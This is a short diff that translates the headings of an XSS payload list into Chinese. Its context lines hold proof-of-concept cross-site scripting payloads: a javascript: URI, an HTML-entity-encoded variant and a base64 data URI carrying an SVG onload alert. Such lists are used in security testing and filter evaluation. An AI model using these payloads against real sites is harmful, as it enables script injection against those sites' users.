@@ -1,4 +1,4 @@
-XSS with javascript:
+java脚本中的XSS:
 ```
 javascript:prompt(1)
 
@@ -7,7 +7,7 @@ javascript:prompt(1)
 &#106&#97&#118&#97&#115&#99&#114&#105&#112&#116&#58&#99&#111&#110&#102&#105&#114&#109&#40&#49&#41
 ```
 
-XSS with data:
+利用data进行XSS:
 ```
 data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+
 ```
